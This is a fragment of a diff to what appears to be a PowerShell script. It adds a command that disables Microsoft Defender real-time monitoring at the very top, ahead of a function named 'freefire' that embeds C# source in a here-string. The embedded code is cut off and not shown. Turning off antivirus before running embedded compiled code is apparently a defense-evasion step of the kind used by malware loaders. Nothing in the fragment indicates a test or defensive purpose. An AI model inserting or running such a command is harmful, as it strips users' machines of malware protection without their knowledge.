@@ -1,3 +1,5 @@
+Set-MpPreference -DisableRealtimeMonitoring $true
+
 function freefire {
     $freefirethegreat = @"
     using System;
